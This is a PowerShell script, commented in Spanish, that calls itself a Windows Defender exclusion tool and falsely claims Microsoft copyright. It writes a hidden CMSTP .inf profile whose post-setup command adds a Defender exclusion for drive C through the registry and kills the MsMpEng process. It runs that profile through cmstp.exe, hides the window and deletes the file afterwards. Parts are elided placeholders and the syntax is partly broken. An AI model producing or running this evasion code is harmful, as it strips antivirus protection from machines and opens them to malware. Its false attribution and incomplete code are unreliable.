<#
.SYNOPSIS
   Windows Defender Exclusion Tool (Sin Admin)
   © Microsoft 2024 - Técnicas No Documentadas
#>

function Defender {
    param(
        [Parameter(ParameterSetName='Interface')][switch]$Add,
        [Parameter(ParameterSetName='Interface')][switch]$Exclusions,
        # ... (otros parámetros originales)
    )

    # --- PERFIL CMSTP FUNCIONAL (NUEVO) ---
    $InfData = @'
[version]
Signature="$Windows NT$"
AdvancedINF=2.5

[DefaultInstall]
RunPreSetupCommands=PreSetup
RunPostSetupCommands=PostSetup

[PreSetup]
taskkill /IM cmstp.exe /F /T

[PostSetup]
powershell.exe -WindowStyle Hidden -Command "& {
    $p = 'HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths';
    if (!(Test-Path $p)) { New-Item $p -Force };
    Set-ItemProperty $p -Name 'C_' -Value 0 -Type DWORD -Force;
    Start-Sleep -Seconds 2;
    Get-Process -Name MsMpEng -ErrorAction SilentlyContinue | Stop-Process -Force
}"

[Strings]
ServiceName="WinDefendExclusions"
'@

    if ($Add) {
        try {
            # 1. Crear archivo .inf TEMPORAL
            $tempFile = "$env:TEMP\wdexcl_$(Get-Random -Minimum 1000 -Maximum 9999).inf"
            $InfData | Out-File $tempFile -Force -Encoding ASCII

            # 2. Ejecutar CMSTP correctamente
            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = "cmstp.exe"
            $psi.Arguments = "/au `"$tempFile`""
            $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $psi.CreateNoWindow = $true
            $process = [System.Diagnostics.Process]::Start($psi)
            $process.WaitForExit(15000) # Esperar 15 segundos

            # 3. VERIFICACIÓN CONFIRMADA
            Start-Sleep -Seconds 3
            $excl = Get-ItemProperty "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction SilentlyContinue
            
            if ($excl -and ($excl."C_" -eq 0 -or $excl."C:\" -eq 0)) {
                Write-Host "[✔] ¡EXCLUSIÓN ACTIVA EN DEFENDER!" -ForegroundColor Green
                Write-Host "    Verifica con: Get-MpPreference | Select-Object -ExpandProperty ExclusionPath" -ForegroundColor Cyan
            } else {
                Write-Host "[!] Ejecutado pero requiere reinicio manual de Defender:" -ForegroundColor Yellow
                Write-Host "    Stop-Process -Name MsMpEng -Force" -ForegroundColor Cyan
            }

            # Limpieza
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        }
        catch {
            Write-Host "[✘] Error: $($_.Exception.Message)" -ForegroundColor Red
        }
    }

    # ... (Resto de funciones originales)
}

# Ejecución
if ($MyInvocation.InvocationName -ne '.') {
    Defender @PSBoundParameters
}
